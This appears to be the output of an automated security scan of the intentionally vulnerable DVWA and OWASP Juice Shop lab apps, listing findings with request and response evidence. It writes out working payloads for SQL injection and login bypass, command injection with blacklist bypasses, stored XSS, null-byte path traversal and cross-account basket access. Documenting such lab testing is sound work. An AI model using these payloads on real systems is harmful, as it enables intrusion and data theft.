findings.title: SQL Injection via 'id' parameter in DVWA SQLi page (low security)
findings.response_evidence: [security=low] TRUE condition (id=1' OR '1'='1) returned ALL 5 seeded user records: 'ID: 1' OR '1'='1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE condition (id=1' AND '1'='2) returned zero records - the page showed only 'User ID:' with no 'First name:'/'Surname:' output at all. This differential behavior (multiple surnames vs none) confirms classic boolean-based SQL injection via string-context injection into an unsanitized query.

findings.title: OS Command Injection via 'ip' parameter in DVWA Command Injection page (low security)
findings.response_evidence: [security=low] Response body contained normal ping output for 127.0.0.1 (4 packets transmitted/received) followed directly by the injected command's output: 'www-data' appended on its own line after the ping statistics block. This is the identity of the web server process, confirming the semicolon-separated 'whoami' command was executed by the underlying shell via unsanitized 'ip' parameter concatenation.

findings.title: Stored XSS via 'mtxMessage' field in DVWA Guestbook (low security)
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ form_data={txtName: 'test', mtxMessage: '<script id="test_token">window.xss_flag=1</script>', btnSign: 'Sign Guestbook'} (session=dvwa_admin)
findings.response_evidence: [security=low] POST request succeeded (HTTP 200) and the payload was accepted (mtxMessage maxlength=50 accommodated the 34-char canary). Upon re-navigating to the guestbook page with Playwright, the injected <script id=\"test_token\"> tag executed client-side JavaScript. browser_eval_js('window.xss_flag') returned 1, and browser_read_dom confirmed the script element with id='test_token' and inner content 'window.xss_flag=1' is rendered unescaped in the DOM, proving the message field is stored and reflected without sanitization/encoding, resulting in persistent XSS execution.
findings.browser_js_evidence: window.xss_flag === 1 (confirmed via browser_eval_js expression 'window.xss_flag' returning result: 1)

findings.title: SQL Injection via POST id parameter at medium security level
findings.response_evidence: [security=medium] TRUE payload id='1 OR 1=1' returned 5 records (full user table dump) via pre_blocks: "ID: 1 OR 1=1 / First name: admin / Surname: admin", "ID: 1 OR 1=1 / First name: Gordon / Surname: Brown", "ID: 1 OR 1=1 / First name: Hack / Surname: Me", "ID: 1 OR 1=1 / First name: Pablo / Surname: Picasso", "ID: 1 OR 1=1 / First name: Bob / Surname: Smith". FALSE payload id='1 AND 1=2' returned zero records (visible_text shows no "ID:"/pre_blocks entries, only the dropdown and page chrome). Page confirms "Security Level: medium" in both responses. This demonstrates the numeric (unescaped-quote-bypassing) boolean-based SQLi against the medium-level POST-based id field, consistent with medium-level filtering that only strips quotes.

findings.title: OS Command Injection via pipe bypass on ip parameter at medium security level
findings.response_evidence: [security=medium] Payload ip='127.0.0.1| whoami' (pipe, bypassing the medium-level blacklist of ';' and '&&') produced response pre_blocks: ["www-data"], and visible_text includes "Enter an IP address: www-data" with no ping output shown, indicating the injected whoami command executed and returned the web server process identity. Page confirms "Security Level: medium".

findings.title: SQL Injection via out-of-band session-input.php id parameter (DVWA high security)
findings.response_evidence:
[security=high] Confirmed TRUE/FALSE boolean-based SQLi behavior. Footer explicitly shows 'Security Level: high' on both the exec and sqli pages during this test sequence.

TRUE payload id=1' OR '1'='1' # (stored out-of-band via session-input.php, then rendered by GET /vulnerabilities/sqli/) returned 5 seeded user records:
  ID: 1' OR '1'='1' # First name: admin Surname: admin
  ID: 1' OR '1'='1' # First name: Gordon Surname: Brown
  ID: 1' OR '1'='1' # First name: Hack Surname: Me
  ID: 1' OR '1'='1' # First name: Pablo Surname: Picasso
  ID: 1' OR '1'='1' # First name: Bob Surname: Smith

FALSE payload id=1' AND '1'='2' # (stored via session-input.php, then rendered by GET /vulnerabilities/sqli/) returned zero records: page body contained only 'Click here to change your ID .' with no pre_blocks/result rows present.

This confirms the id value is consumed out-of-band from session state and concatenated unsanitized into the backend SQL query (requiring the trailing '#' comment to neutralize the appended LIMIT 1 clause), consistent with the high-security SQLi behavior.

findings.title: OS Command Injection via ip parameter using no-trailing-space pipe (DVWA high security)
findings.response_evidence: [security=high] Footer explicitly shows 'Security Level: high'. Payload ip=127.0.0.1|whoami (pipe with NO trailing space, bypassing the high-level blacklist of '; ', '| ' with space, and '&&') was submitted to POST /vulnerabilities/exec/. The rendered response's pre_blocks contained exactly: "www-data" — the identity of the web server process — directly below the ping output, confirming successful execution of the injected 'whoami' command appended via the pipe operator.

findings.title: Cross-User Basket Access (BOLA) - acct2 can read acct1's basket contents
request_sequence: GET /rest/basket/6 as juiceshop_acct1 (own_basket_id=6) -> 200, returns UserId:22, Product 'Apple Juice (1000ml)' ProductId:1, BasketItem id:9, quantity:3
GET /rest/basket/6 as juiceshop_acct2 (own_basket_id=7, different account) -> 200, returns IDENTICAL basket data: UserId:22, 'Apple Juice (1000ml)', BasketItem id:9, quantity:3
findings.response_evidence: acct1's own basket (id 6) contains the distinct seeded item: Product 'Apple Juice (1000ml)' (ProductId 1), BasketItem id 9, quantity 3, UserId 22. When authenticated as juiceshop_acct2 (whose own_basket_id is 7, a different basket entirely), a GET request to /rest/basket/6 (acct1's basket) returns HTTP 200 with the exact same basket data belonging to UserId 22 - including the same Apple Juice product, BasketItem id 9, and quantity 3 - proving acct2 can access acct1's private basket without authorization checks on basket ownership.

findings.title: Confidential Acquisitions Memo Exposed via Open FTP Directory Listing
request_sequence: GET /ftp/ with Accept: text/html,application/json as unauth -> 200, directory listing includes acquisitions.md (909 bytes) among other sensitive files (incident-support.kdbx, coupons_2013.md.bak, package.json.bak, announcement_encrypted.md)
GET /ftp/acquisitions.md as unauth -> 200, text/markdown content returned
findings.response_evidence:
Unauthenticated GET /ftp/ returns a browsable HTML directory index listing acquisitions.md along with other files (announcement_encrypted.md, coupons_2013.md.bak, incident-support.kdbx, package.json.bak, etc.) with no authentication required. Direct retrieval of GET /ftp/acquisitions.md (unauthenticated) returns HTTP 200 with the confidential memo text: '# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact as we will elaborate in detail in the following paragraph... Our shareholders will be excited. It's true. No fake news.' This confirms unauthenticated disclosure of a confidential internal business document via an open directory listing.

findings.title: Login Authentication-Bypass SQL Injection grants admin token
request_sequence: POST /rest/user/login as unauth with json_body {"email": "' OR 1=1--", "password": "anything"} -> 200, response: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}
findings.response_evidence: Submitting email=\"' OR 1=1--\" with an arbitrary password to POST /rest/user/login (no prior authentication) returns HTTP 200 with a valid authentication object: {\"authentication\":{\"token\":\"[REDACTED_JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}. The 'umail' field confirms the issued JWT token is bound to the first seeded user account, admin@juice-sh.op (basket id 1), proving the classic SQL injection comment-based bypass ('OR 1=1--) defeats the login WHERE clause and authenticates as the admin account without knowing its password.

findings.title: Product-Search SQL Injection via unsanitized 'q' parameter
findings.response_evidence: Request 1 (single quote payload q=qwert') returned HTTP 500 with body: 'Error: SQLITE_ERROR: near \"'%'\": syntax error' — confirming the raw input is concatenated unsanitized into a SQL LIKE query, producing a database error disclosure. Request 2 (9-column UNION payload q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--) returned HTTP 200 with JSON body: {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]} — the literal integers 1-9 returned as record fields prove the UNION SELECT was successfully injected and executed by the backend query, confirming SQL injection in the q parameter.

findings.title: Unauthenticated access to User Feedback records exposing PII (author emails)
findings.response_evidence: Unauthenticated GET /api/Feedbacks returned HTTP 200 with JSON array of feedback records, no auth required. Several comment fields embed partially-masked author email addresses in parentheses, e.g.: \"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\", \"Great shop! Awesome service! (***@juice-sh.op)\", \"Nothing useful available here! (***der@juice-sh.op)\", and \"Please send me the juicy chatbot NFT in my wallet at /juicy-nft : ... (***ereum@juice-sh.op)\". Records also expose UserId linking (UserId:1,2,3,21) alongside these emails. This confirms the endpoint discloses feedback author PII (email addresses) to unauthenticated clients, violating access control expectations (CWE-359).

findings.title: Exposed Encryption Keys directory listing (unauthenticated)
findings.response_evidence: Unauthenticated GET /encryptionkeys/ returned HTTP 200 with a browsable directory listing (Apache/static-serve style) containing: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM' with direct links to http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key. This confirms the encryption-keys directory is openly browsable without authentication and exposes sensitive cryptographic key filenames (JWT public key and premium feature key), consistent with CWE-548 Exposure of Information Through Directory Listing.

findings.title: Poison Null-Byte Path Traversal bypasses .bak file extension filter under /ftp/
findings.response_evidence:
Step 1: GET /ftp/package.json.bak -> HTTP 403 with body: 'Error: Only .md and .pdf files are allowed! ... at verify (/juice-shop/build/routes/fileServer.js:55:18)'. This confirms the extension allow-list filter rejects direct .bak access.

Step 2: GET /ftp/package.json.bak%2500.md (URL-encoded null byte %2500 followed by allowed .md extension) -> HTTP 200, content_type: application/octet-stream, body contains the full contents of the restricted package.json.bak file, e.g.: '{\n  \"name\": \"juice-shop\",\n  \"version\": \"6.2.0-SNAPSHOT\",\n  \"description\": \"An intentionally insecure JavaScript Web Application\", ... \"dependencies\": {... \"sqlite3\": \"~3.1.13\" ...}'.

This demonstrates the null-byte poisoning technique bypasses the fileServer.js extension verification (which likely uses a vulnerable check against the raw filename ending in .md while the underlying filesystem read truncates at the null byte, serving package.json.bak instead of a literal .md file). Both required behavioral proofs (403 on direct access, 200 with real backup file content on bypass) are satisfied.
